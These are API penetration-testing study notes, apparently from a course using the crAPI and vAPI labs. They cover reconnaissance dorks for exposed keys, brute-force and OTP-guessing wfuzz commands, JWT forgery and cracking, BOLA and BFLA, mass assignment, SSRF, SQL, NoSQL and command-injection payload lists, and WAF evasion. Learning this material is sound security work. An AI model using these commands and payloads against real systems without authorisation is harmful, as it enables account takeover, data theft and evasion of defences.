# APISEC

## Docker Commands

```bash
# Pull service images
sudo docker-compose pull
# Create and start containers (file, detached mode)
sudo docker-compose up -d
sudo docker-compose -f docker-compose.yml --compatibility up -d
# Stop services
sudo docker-compose stop
# List containers
sudo docker-compose ps
```

## API Reconnaissance

### API Types

1. Open/Public APIs - meant to be easily found and used by end-users. Public APIs may be entirely public without authentication or be meant for use by authenticated users.
2. Internal/Private APIs - intended for use, privately, within an organization. These APIs are often documented less than partner APIS, if at all, and if any documentation exists it is even harder to find.
3. Partner APIs - intended to be used exclusively by partners of the provider. These might be harder to find if you are not a partner. Partner APIs may be documented, but documentation is often limited to the partner.

### Web API Indicators

#### URL Schemes

```http
https://target-name.com/api/v1
https://api.target-name.com/v1
https://target-name.com/docs
https://dev.target-name.com/rest
```

Look for API indicators within directory names like:

`/api, /api/v1, /v1, /v2, /v3, /rest, /swagger, /swagger.json, /doc, /docs, /graphql, /graphiql, /altair, /playground`

#### Subdomains

```http
api.target-name.com
uat.target-name.com
dev.target-name.com
developer.target-name.com
test.target-name.com
```

#### Headers / Data

_HTTP Request and Response Headers containing:_

_`"Content-Type: application/json, application/xml"`_

&#x20;_Also, watch for HTTP Responses that include statements like:_

_`{"message": "Missing Authorization token"}`_

### Passive

Passive API Reconnaissance is the act of obtaining information about a target without directly interacting with the target’s systems. When you take this approach, your goal is to find and document public information about your target’s attack surface.&#x20;

#### Google Dorking

First, just Google search for companies API. Ex: `reddit api`

```python
intitle:"api" site:"coinbase.com"
intitle:json site:ebay.com
intitle:"index.of" intext:"api.txt"  # Finds publicly available API key files.
inurl:"/api/v1" site:microsoft.com
inurl:"/wp-json/wp/v2/users"  # Finds all publicly available WordPress API user directories.
inurl:"/api/v1" intext:"index of /"  # Finds potentially interesting API directories.
ext:php inurl:"api.php?action="  # Finds all sites with a XenAPI SQL injection vulnerability. (This query was posted in 2016; four years later, there are currently 141,000 results.)
basintitle:"index of" api_key OR "api key" OR apiKey -pool  # This is one of my favorite queries. It lists potentially exposed API keys.
```

#### Git Dorking

Begin by searching GitHub for your target organization’s name paired with potentially sensitive types of information, such as “api key,” "api keys", "apikey", "authorization: Bearer", "access\_token", "secret", or “token.” Then browse code, issues, and review proposed changes in pull requests.

Similar to Google Dorking, with GitHub, you can specify parameters like:

`filename:swagger.json`, `extension:.json`, `"authorization: Bearer"`,&#x20;

#### TruffleHog

[https://github.com/trufflesecurity/trufflehog](https://github.com/trufflesecurity/trufflehog)

TruffleHog is a great tool for automatically discovering exposed secrets. You can simply use the following Docker run to initiate a TruffleHog scan of your target's GitHub.

`sudo docker run -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest github --org=target-name`

#### API Directories

Programmableweb.com is a go-to source for API-related information ([https://www.programmableweb.com/apis/directory](https://www.programmableweb.com/apis/directory)). To learn about APIs, you can use their API University. To gather information about your target, use the API Directory, a searchable database of over 23,000 APIs. Expect to find API endpoints, version information, business logic information, the status of the API, source code, SDKs, articles, API documentation, and a changelog.

#### Shodan

```bash
# Try searching on company/target name, port, etc.
hostname:"targetname.com"  # Using hostname will perform a basic Shodan search for your target’s domain name. This should be combined with the following queries to get results specific to your target.
"content-type: application/json"  # APIs should have their content-type set to JSON or XML. This query will filter results that respond with JSON.
"content-type: application/xml"  # This query will filter results that respond with XML.
"200 OK"  # You can add "200 OK" to your search queries to get results that have had successful requests. However, if an API does not accept the format of Shodan’s request, it will likely issue a 300 or 400 response.
"wp-json"  # This will search for web applications using the WordPress API.
```

#### The Wayback Machine

[https://archive.org/web/](https://archive.org/web/)

Check for differences between the API documentation. Later, when you are actively testing the API, make sure to test using old endpoints,

### Active

Active reconnaissance is the process of interacting directly with the target primarily through the use of scanning. We will use our recon to search for our target's APIs and any useful information.

#### nmap

```bash
nmap -p- 127.0.0.1
nmap -sC -sV -p<PORTS> 127.0.0.1
```

#### amass

```bash
amass enum -list  # See which data sources are available (paid and free)
amass enum -active -d crapi.apisec.ai
amass enum -active -d microsoft.com | grep api
```

#### gobuster

```bash
gobuster dir -u http://127.0.0.1:8888 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --wildcard -b 200
gobuster dir -u http://127.0.0.1:8888/community -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

#### kiterunner

```bash
kr scan HTTP://127.0.0.1 -w ~/api/wordlists/data/kiterunner/routes-large.kite
# Use a text wordlist rather than a .kite file, use the brute option with the text file of your choice
kr brute <target> -w ~/api/wordlists/data/automated/nameofwordlist.txt
```

#### DevTools

F12 --> Network --> ctrl+r

Add URL column (Right click on column header and check URL)

Can copy URL as curl request and import into Postman

## Endpoint Analysis

### Reverse Engineering an API

In the instance where there is no documentation and no specification file, you will have to reverse-engineer the API based on your interactions with it

#### Building a Collection in Postman

From Postman:

* Create a Workspace then select Create Collection.
* Select Capture Request on the bottom right.
* Select Enable proxy --> Enable proxy (Port 5555)
* Specify the URL to target. Ex: crapi.apisec.ai

From Browser:

* Navigate to crapi.apisec.ai
* Select Postman option from FoxyProxy
* Refresh page and you'll see requests populate in Postman
* Continue to perform actions in the application i.e. sign up, login, navigate around, updating profile pictures, adding video, changing email etc. Postman will continue to populate

From Postman:

* After done, capturing can be stopped in Postman
* Select Requests and check ones you want to add to the collection
* Select ellipsis to the right of Collection URL to Add folders and organize the API calls
* Now can browse and send requests to get a sense of what is going on

#### Automatic Documentation

mitmweb

* Start mitmweb: `mitmweb`
* Change FoxyProxy to use Burp/Port 8080
* Perform actions in the application i.e. sign up, login, navigate around, updating profile pictures, adding video, changing email etc. mitmproxy will continue to populate
* When done, select File --> Save and turn off proxy

mitmproxy2swagger

```bash

sudo mitmproxy2swagger -i ~/Downloads/flows -o spec.yml -p http://crapi.apisec.ai -f flow
sudo vim spec.yml
# Remove the "/ignore:" for all lines where there looks to be an API call
# Ex: ignore:/identity/api/auth/login to /identity/api/auth/login
# Rerun the initial command
sudo mitmproxy2swagger -i ~/Downloads/flows -o spec.yml -p http://crapi.apisec.ai -f flow --examples
```

Navigate to the Swagger Editor: [https://editor.swagger.io/](https://editor.swagger.io/)

Select File --> Import file --> and select the spec.yml file.

From Postman, Import a new Collection, selecting the same spec.yml file.

### Using APIs and Excessive Data

| Convention | Example                                                                                                                           | Meaning                                                                                                                                                                                                                  |
| ---------- | --------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| : or {}    | <p>/user/:id</p><p>/user/{id}</p><p>/user/2727</p><p>/account/:username</p><p>/account/{username}</p><p>/account/scuttleph1sh</p> | The colon or curly brackets are used by some APIs to indicate a path variable. In other words, “:id” represents the variable for an ID number and “{username}” represents the account username you are trying to access. |
| \[ ]       | /api/v1/user?find=\[name]                                                                                                         | Square brackets indicate that the input is optional.                                                                                                                                                                     |
| \|\|       | “blue” \|\| “green” \|\| “red”                                                                                                    | Double bars represent different possible values that can be used.                                                                                                                                                        |

Can review the APIs using the Swagger editor as well as Postman

From Postman, we can edit the Workspace to provide Authorization using the Bearer Token which will be applied to all of the requests within it.

Using the Variables tab, you can create variables that will be used through the requests i.e. baseurl

Can also create a New Environment to create variables across multiple Collections.

Can change the request type for a request to see how it reacts i.e. GET to POST

Now to to review and send requests to look at the responses for Excessive Data Exposure

## Scanning APIs

### Finding Security Misconfigurations

Once you have discovered an API and used it as it was intended, you can proceed to perform a baseline vulnerability scan.

#### OWASP ZAP

API Specification File:

Plug in the target URL, but to improve the results and to make sure we hit everything, we can import the target's API specification file i.e. specs.yml. Select Import --> Import an OpenAPI definition from the local file system. The Sites window should fill with the target's endpoints and API requests. You can right-click on the root folder and start an active scan.

Manual Explore:

Select the Manual Explore option and set the URL of the target and select Launch Browser. Start using the application as intended by navigating around, signing up and signing in, and any other available actions. Once authenticated and performed a baseline set of actions an active scan can be started. Can also turn on the Attack Mode. Investigate the results.

## API Authentication Attacks

### Classic Authentication Attacks

#### Password Brute-Force Attacks

Burp Suite:

Utilized Intruder to brute force Username/Email and Password.

wfuzz:

```bash
# All usernames against all passwords
wfuzz -d '{"email":"admin@email.com","password":"FUZZ"}' -H 'Content-Type: application/json' -z file,/usr/share/wordlists/rockyou.txt -u http://crapi.apisec.ai/identity/api/auth/login --hc 500
ffuf -u http://127.0.0.1/vapi/api2/user/login -d "email=HFUZZ&password=WFUZZ" -H "Content-type: application/x-www-form-urlencoded" -mode clusterbomb -w emails.txt:HFUZZ -w passwords.txt:WFUZZ -fc 401
# Line by line e.g. first email against first password, second email against second password
ffuf -u http://127.0.0.1/vapi/api2/user/login -d "email=HFUZZ&password=WFUZZ" -H "Content-type: application/x-www-form-urlencoded" -mode pitchfork -w emails.txt:HFUZZ -w passwords.txt:WFUZZ -fc 401

```

#### Password Spraying

Long list of users with a short list of targeted passwords. Knowing the password policy such as login attempts and password complexity will help build out the password list.

Example finding user's emails via excessive data exposure vulnerability. Can copy the response from Postman and use grep to filter out just the emails:

```bash
grep -oe "[a-zA-Z0-9._]+@[a-zA-Z]+.[a-zA-Z]+" response.json > users.tmp
grep -oe "[a-zA-Z0-9._]+@[a-zA-Z]+.[a-zA-Z]+" response.json | sort -u > users.txt
```

Burp Suite:

Can use the Cluster bomb within intruder to select the email and password values.

wfuzz:

```bash
wfuzz -d '{"email":"FUZZ","password":"FUZ2Z"}' -H 'Content-Type: application/json' -z file,emails.txt -z file,passwords.txt -u http://crapi.apisec.ai/identity/api/auth/login --hc 500

```

Creating targeted password lists: [https://github.com/sc0tfree/mentalist](https://github.com/sc0tfree/mentalist), [https://github.com/Mebus/cupp](https://github.com/Mebus/cupp)

### API Token Attacks

#### Token Analysis

Example using crAPI API authentication request and proxy it over to Burp Suite.

1. Intercept login request and send to Sequencer
2. Select Configure next to Custom location.
   1. Highlight the whole token in between the quotes and Save.
3. Select Start live capture
   1. Will capture 20,000 tokens
4. When completed, select Analyze now if it doesn't start automatically
5. Review results looking at the complexity and randomness of them.
   1. Shows complex tokens can be predictable.
   2. Also check if the tokens are being generated sequentially

#### JWT Attacks

JWTs consist of three parts, all of which are base64 encoded and separated by periods: the header, payload, and signature.

[https://jwt.io/introduction](https://jwt.io/introduction)

If you’ve captured another user’s JWT or maybe discovered a leaked token during reconnaissance, you can try sending it to the provider and pass it off as your own.

#### Automating JWT Attacks with JWT\_TOOL

[https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology](https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology)

<pre class="language-bash"><code class="lang-bash"><strong>jwt_tool &#x3C;JWT TOKEN>
</strong><strong>jwt_tool -t http://127.0.0.1:8888/identity/api/v2/user/dashboard -rh "Authorization: Bearer &#x3C;JWT TOKEN>" -M pb
</strong><strong>jwt_tool &#x3C;JWT TOKEN> -X a
</strong></code></pre>

#### The None Attack

If you ever come across a JWT using "none" as its algorithm, you’ve found an easy win. After decoding the token, you should be able to clearly see the header, payload, and signature. From here, you can alter the information contained in the payload to be whatever you’d like.

#### The Algorithm Switch Attack

There is a chance the API provider isn’t checking the JWTs properly. If this is the case, we may be able to trick a provider into accepting a JWT with an altered algorithm. One of the first things you should attempt is sending a JWT without including the signature. This can be done by erasing the signature altogether and leaving the last period in place, like this:

`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJoYWNrYXBpcy5pbyIsImV4cCI6IDE1ODM2Mzc0ODgsInVzZ XJuYW1lIjoiU2N1dHRsZXBoMXNoIiwic3VwZXJhZG1pbiI6dHJ1ZX0.`

If this isn’t successful, attempt to alter the algorithm header field to "none". Decode the JWT, update the "alg" value to "none", base64-encode the header, and send it to the provider. To simplify this process, you can also use the jwt\_tool to quickly create a token with the algorithm switched to none.

`jwt_tool eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJ1c2VyYWFhQGVtYWlsLmNvbSIsImlhdCI6MTY1ODg1NTc0MCwiZXhwIjoxNjU4OTQyMTQwfQ._EcnSozcUnL5y9SFOgOVBMabx_UAr6Kg0Zym-LH_zyjReHrxU_ASrrR6OysLa6k7wpoBxN9vauhkYNHepOcrlA -X a`

A more likely scenario than the provider accepting no algorithm is that they accept multiple algorithms. For example, if the provider uses RS256 but doesn’t limit the acceptable algorithm values, we could alter the algorithm to HS256. This is useful, as RS256 is an asymmetric encryption scheme, meaning we need both the provider’s private key and a public key in order to accurately hash the JWT signature. Meanwhile, HS256 is symmetric encryption, so only one key is used for both the signature and verification of the token. If you can discover and obtain the provider’s RS256 public key then switch the algorithm from RS256 to HS256, there is a chance you may be able to leverage the RS256 public key as the HS256 key. It uses the format jwt\_tool TOKEN -X k -pk public-key.pem, as shown below. You will need to save the captured public key as a file on your attacking machine (You can simulate this attack by taking any public key and saving it as public-key-pem).

`jwt_tool eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJ1c2VyYWFhQGVtYWlsLmNvbSIsImlhdCI6MTY1ODg1NTc0MCwiZXhwIjoxNjU4OTQyMTQwfQ._EcnSozcUnL5y9SFOgOVBMabx_UAr6Kg0Zym-LH_zyjReHrxU_ASrrR6OysLa6k7wpoBxN9vauhkYNHepOcrlA -X k -pk public-key-pem`

#### JWT Crack Attack

The JWT Crack attack attempts to crack the secret used for the JWT signature hash, giving us full control over the process of creating our own valid JWTs.

```bash
crunch 5 5 -o crAPIpw.txt
jwt_tool <JWT TOKEN> -C -d crAPIpw.txt
```

In jwt.io you can add your user token to the JWT debugger, add the newly discovered secret, and update the "sub" claim to any email that has registered.

## Exploiting API Authorization

### Broken Object Level Authorization

When hunting for BOLA there are three ingredients needed for successful exploitation:

1. Resource ID: a resource identifier will be the value used to specify a unique resource. This could be as simple as a number, but will often be more complicated.
2. Requests that access resources. In order to test if you can access another user's resource, you will need to know the requests that are necessary to obtain resources that your account should not be authorized to access.
3. Missing or flawed access controls. In order to exploit this weakness, the API provider must not have access controls in place. This may seem obvious, but just because resource IDs are predictable, does not mean there is an authorization vulnerability present.

The third item on the list is something that must be tested, while the first two are things that we can seek out in API documentation and within a collection of requests. Once you have the combination of these three ingredients then you should be able to exploit BOLA and gain unauthorized access to resources.

#### Finding Resource IDs and Requests

If you can successfully access the information you shouldn’t be authorized to access, you have discovered an authorization vulnerability.

Here are a few ideas for requests that could be good targets for an authorization test.

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

#### Searching for BOLA

First, let's think about the purpose of our target app and review the documentation. Thinking through the purpose of the app will give you a conceptual overview and help aim your sights. Ask questions like: What can you do with this app? Do you get your own profile? Can you upload files? Do you have an account balance? Is there any part of the app that has data specific to your account? Questions like these will help you search through the available requests and find a starting point for discovering requests that access resources.

#### Authorization Testing Strategy

When searching for authorization vulnerabilities the most effective way to find authorization weaknesses is to create two accounts and perform A-B testing. The A-B testing process consists of:

1. Create a UserA account
2. Use the API and discover requests that involve resource IDs as UserA
3. Document requests that include resource IDs and should require authorization
4. Create a UserB account
5. Obtaining a valid UserB token and attempt to access UserA's resources

### Broken Function Level Authorization

Where BOLA is all about accessing resources that do not belong to you, BFLA is all about performing unauthorized actions. BFLA vulnerabilities are common for requests that perform actions of other users. These requests could be lateral actions or escalated actions

For BFLA we will be hunting for very similar requests to BOLA:

1. Resource ID: a resource identifier will be the value used to specify a unique resource
2. Requests that perform authorized action. In order to test if you can access another update, delete, or otherwise alter the resources of other users
3. Missing or flawed access control. In order to exploit this weakness, the API provider must not have access controls in place

## Testing for Improper Assets Management

### Improper Asset Management

#### Testing for Improper Assets Management

Testing for Improper Assets Management is all about discovering unsupported and non-production versions of an API. Often times an API provider will update services and the newer version of the API will be available over a new path like the following:

* api.target.com/v3
* /api/v2/accounts
* /api/v3/accounts
* /v2/accounts

API versioning could also be maintained as a header:

* _Accept: version=2.0_
* _Accept api-version=3_

In addition versioning could also be set within a query parameter or request body.

* /api/accounts?ver=2
* POST /api/accounts\
  \
  {\
  "ver":1.0,\
  "user":"hapihacker"\
  }

#### Improper Assets Management Testing

When it comes to Improper Assets Management vulnerabilities, it is always a good idea to test from both unauthenticated and authenticated perspectives.

1. Understand the baseline versioning information of the API you are testing. Make sure to check out the path, parameters, and headers for any versioning information.
2. To get better results from the Postman Collection Runner, we’ll configure a test using the Collection Editor. Add a test that will detect when a status code 200 is returned so that anything that does not result in a 200 Success response may stick out as anomalous
3. Run an unauthenticated baseline scan of the collection with the Collection Runner. Make sure that "Save Responses" is checked as seen below.
4. Review the results from your unauthenticated baseline scan to have an idea of how the API provider responds to requests using supported production versioning.
5. Next, use "Find and Replace" to turn the collection's current versions into a variable. Make sure to do this for all versions. Type the current version into "Find", update "Where" to the targeted collection, and update "Replace With" to a variable.
6. Open Postman and navigate to the environmental variables. Note, we are using environmental variables so that this test can be accessed and reused for other API collections. Add a variable named "ver" to your Postman environment and set the initial value to "v1". Now you can update to test for various versioning-related paths such as v1, v2, v3, mobile, internal, test, and uat. As you come across different API versions expand this list of variables.
7. Now that the environmental variable is set to v1 use the collection runner again and investigate the results. You can drill down into any of the requests by clicking on them.
8. If requests to paths that do not exist result in Success 200 responses, we’ll have to look out for other indicators to use to detect anomalies. Update the environmental variable to v2. Once again, run the collection runner with the new value set and review the results.

Example Brute Force OTP on /v2 API that does not have a limitations on the number of guesses.

```bash

wfuzz -d '{"email":"hapihacker@email.com", "otp":"FUZZ","password":"NewPassword1"}' -H 'Content-Type: application/json' -z file,/usr/share/wordlists/SecLists-master/Fuzzing/4-digits-0000-9999.txt -u http://crapi.apisec.ai/identity/api/auth/v2/check-otp --hc 500
wfuzz -d '{"username":"richardbranson", "pin":"FUZZ"}' -H 'Content-Type: application/json' -z file,/usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -u http://vapi.apisec.ai/vapi/api9/v1/user/login -Z

```

## Mass Assignment

### Mass Assignment Attacks

Mass Assignment vulnerabilities are present when an attacker is able to overwrite object properties that they should not be able to. A few things need to be in play for this to happen. An API must have requests that accept user input, these requests must be able to alter values not available to the user, and the API must be missing security controls that would otherwise prevent the user input from altering data objects. The classic example of a mass assignment is when an attacker is able to add parameters to the user registration process that escalate their account from a basic user to an administrator. The user registration request may contain key-values for username, email address, and password. An attacker could intercept this request and add parameters like "isadmin": "true". If the data object has a corresponding value and the API provider does not sanitize the attacker's input then there is a chance that the attacker could register their own admin account.

#### Finding Mass Assignment Vulnerabilities

One of the ways that you can discover mass assignment vulnerabilities by finding interesting parameters in API documentation and then adding those parameters to requests. Look for parameters involved in user account properties, critical functions, and administrative actions.

#### Fuzzing for Mass Assignment with Param Miner

Param Miner is a Burp Suite extension. To use, right click on a request, select Extensions --> Param Miner --> Guess params --> Guess JSON.

#### Other Mass Assignment Vectors

Mass assignment attacks go beyond making attempts to become an administrator. You could also use mass assignment to gain unauthorized access to other organizations, for instance. If your user objects include an organizational group that allows access to company secrets or other sensitive information, you can attempt to gain access to that group.

#### Hunting for Mass Assignment

As with many other API attacks, we will start hunting for this vulnerability by analyzing the target API collection. Remember, mass assignment is all about binding user input to data objects. So, when you analyze a collection that you are targeting you will need to find requests that:

* Accept user input
* Have the potential to modify objects

## Server-Side Request Forgery

### Exploiting SSRF

Server-Side Request Forgery (SSRF) is a vulnerability that takes place when an application retrieves remote resources without validating user input. An attacker can supply their own input, in the form of a URL, to control the remote resources that are retrieved by the targeted server.

#### SSRF Impact

The impact of this vulnerability is that an attacker would be able to leverage the target server to perform and process requests that they supply. The attacker could supply URLs that expose private data, scan the target's internal network, or compromise the target through remote code execution.

#### Types of SSRF

1. In-Band SSRF
   1. For an In-Band SSRF, a URL is specified as an attack. The request is sent and the content of your supplied URL is displayed back to you in a response.
2. Blind SSRF
   1. Blind (or Out of Band) SSRF takes place when a vulnerable server performs a request from user input but does not send a response back to the user indicating a successful attack.
   2. In this case, the response is returned and we do not have any indication that the server is vulnerable. Instead of we will need to provide the URL to a web server that will let us see if a request is actually made. To stick with free tools, we will leverage:
      1. http://webook.site
      2. http://pingb.in
      3. https://requestbin.com
      4. https://caraytokens.org

#### Ingredients for SSRF

When targeting an API for SSRF vulnerabilities, you will want to look for requests that have any of the following:

* Include full URLs in the POST body or parameters
* Include URL paths (or partial URLs) in the POST body or parameters
* Headers that include URLs like Referer
* Allows for user input that may result in a server retrieving resources

#### Testing SSRF

...

## Injection Attacks

### Testing for Injection Vulnerabilities

You should attempt fuzzing against all potential inputs and especially within the following:

* Headers
* Query string parameters
* Parameters in POST/PUT requests

#### Discovering Injection Vulnerabilities

Before you can exploit an injection vulnerability you will need to know where to fuzz and what to fuzz with. The art of fuzzing is knowing the right payload to send in the right requests with the right tools. The right payload can be guessed or narrowed down based on reconnaissance efforts.

#### SQL Injection Metacharacters

When looking for requests to target for database injections, seek out those that allow client input and can be expected to interact with a database. Here are some SQL metacharacters that can cause some issues:

```bash
'
''
;%00
--
-- -
""
;
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
OR 1=1
```

#### NoSQL Injection

The following are common NoSQL metacharacters you could send in an API request to manipulate the database:

```bash
$gt 
{"$gt":""}
{"$gt":-1}
$ne
{"$ne":""}
{"$ne":-1}
 $nin
{"$nin":1}
{"$nin":[1]}
{"$where":  "sleep(1000)"}
```

#### OS Command Injection

Characters such as the following all act as command separators, which enable a program to pair multiple commands together on a single line. If a web application is vulnerable, it would allow an attacker to add command separators to existing command and then follow it with additional operating system commands:

```bash
# Command Separators
|
||
&
&&
'
"
;
'"
# System commands to use
ipconfig
dir
ver
whoami
ifconfig
ls
pwd
```

#### Fuzzing Wide with Postman

Postman really shines when it comes to testing an entire API collection thanks to the Collection Runner. Whereas, Burp Suite CE and WFuzz are much better at digging into individual requests.

#### Injection Targets

For injection targets, we will begin by casting a wide net and seeing which requests respond in interesting ways. Let's target many of the requests that include user input.

#### Fuzzing Deep with WFuzz

Intercept request in Burp to view details to provide to the wfuzz command.

```bash
wfuzz -z file,usr/share/wordlists/nosqli \
 -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" \
 -d "{\"coupon_code\":FUZZ} http://crapi.apisec.ai/community/api/v2/coupon/validate-coupon
 
```

## Evasion and Combining Techniques

### Evasive Maneuvers

&#x20;Security controls may differ from one API provider to the next, but at a high level, they will have some threshold for malicious activity that will trigger a response. WAFs, for example, can be triggered by a wide variety of things, like:

* Too many requests for resources that do not exist.
* Too many requests within a certain amount of time
* Common attack attempts, like SQL injection and XSS attacks
* Abnormal behavior, like tests for authorization vulnerabilities

#### String Terminators

Null bytes and other combinations of symbols are often interpreted as string terminators used to end a string. If these symbols are not filtered out, they could terminate the API security control filters that may be in place.

```bash
%00
0x00
//
;
%
!
?
[]
%5B%5D
%09
%0a
%0b
%0c
%0e
```

String terminators can be placed in different parts of the request, like the path or POST body, to attempt to bypass any restrictions in place.

#### Case Switching

Case switching is the literal switching of the case of the letters within the URL path or payload. To bypass rate-limiting or other WAF controls you may be able to simply alter the URL path by switching upper- and lower-case letters in the path:

```bash
# Actual API
POST /api/myprofile
# Case Switching
POST /api/myProfile
POST /api/MyProfile
POST /aPi/MypRoFiLe 
```

#### Encoding Payloads

To take your WAF-bypassing attempts to the next level, try encoding payloads. Encoded payloads can often trick WAFs while still being processed by the target application or database. Even if the WAF or an input-validation measure blocks certain characters or strings, they might miss encoded versions of those characters. Alternatively, you could also try double encoding your attacks.

#### Evasion with WFuzz

If you need to encode a payload, you’ll need to know the name of the encoder you want to use. To see a list of all WFuzz encoders, use the following: `wfuzz -e encoders`

<pre class="language-bash"><code class="lang-bash"># To use an encoder, add a comma to the payload and specify its name:
<strong>wfuzz -z file,wordlist/api/common.txt,base64 http://hapihacker.com/FUZZ
</strong># To have a payload processed multiple encoders specify them with a hyphen
wfuzz -z list,a-b-c,base64-md5-none -u http://hapihacker.com/api/v2/FUZZ
# To have a payload processed multiple times specify them with a @
wfuzz -d '{"email":"test@test.com"}, "otp":"FUZZ" -H 'Content-Type: application/json' \
 -z list,TEST1,base64@base64@md5 -u http://URL/API
</code></pre>

### Combining Techniques

#### Suggestions for Combining Vulnerabilities and Techniques

Excessive Data Exposure and Improper Assets Management are both API weaknesses that stand out above the others to combine in order to escalate the impact of your attacks.

* Excessive data exposure is a vulnerability that can be leveraged in many other attacks. Excessive Data Exposure can be a great source of information about users and administrators. Make sure that you take note of all parameters leaked in exposure, such as username, email, privilege level, and unique user identifiers. All of this information could be challenging to come across otherwise but can be leveraged in authentication and authorization attacks.
* Improper Assets Management vulnerability is a weakness that should be combined with all other attack techniques. Improper Assets Management implies that a version of the API may not be as supported as the current version and thus it may not be as protected. Perform all of the other attacks against the unmanaged endpoint. You may find that the security of a api/test/login, api/mobile/login, api/v1/login, api/v1/internal/users may have fewer protections than the supported counterparts. With Improper Assets Management findings there could be lax rate-limiting, missing protections for brute force attempts, missing input validation, unlimited multifactor authentication requests, authorization vulnerabilities, etc. With APIs affected by Improper Assets Management vulnerabilities you never know what you’re going to get. So, make sure to perform the full gambit of attack techniques against unsupported versions of the API.
* If you are testing a file upload function, attempt to use the directory traversal fuzzing attack along with the file upload to manipulate where the file is stored. Upload files that lead to a shell and attempt to execute the uploaded file with the corresponding web application.
* Perhaps you have discovered a Broken Function Level Authorization (BFLA) or Mass Assignment weakness that has given you access to administrative functionality. There is a chance that an API provider trusts its administrators and does not have as many technical protections in place. You could then use this new level of access to search for Improper Assets Management, injection weaknesses, or Broken Object Level Authorization weaknesses.
* If you are able to perform a mass assignment, then there is a chance that the parameter or parameters that you can alter may not be protected from injection attacks and/or Server-side Request Forgery. When you have discovered mass assignment fuzz the parameter for other weaknesses.
* If you are able to update to perform a BFLA attack and update another user’s profile information perhaps you could combine this with an XSS attack.
* Combine Injection attacks with most other vulnerabilities. For example, if you are able to manipulate a JSON Web Token. Consider including various different types of injection attacks into the JSON Web Token.
* Consider ways to fully leverage BOLA findings. Use the information that you are able to access to gain access elsewhere. Always test to see if your BOLA discovery can be used in a BFLA attack. In other words, if you find a BOLA vulnerability that provides you with other users’ bank account information check to see if you are also able to exploit a BFLA vulnerability to transfer funds.
* If you are up against API security controls like a WAF or rate-limiting, make sure to apply evasion techniques to your attacks. Encode your attacks and attempt to find ways to bypass these security measures. If you have exhausted your testing efforts, return to fuzzing wide with encoded and obfuscated attacks.

## Postman

### Duplicate Collection

1. Select the ellipsis to the right of the current selection
2. Select Duplicate
3. Can rename the new Collection

### Run Collection

1. Select the ellipsis to the right of the current selection
2. Select Run collection
3. Select the necessary request to target
4. Select Save responses
5. Run the collection
6. Review Failed tests
   1. Develop understanding how the API is responding to expected requests and how the API responds to our fuzzing attempts
      1. Document results to compare for after the next run of the collection
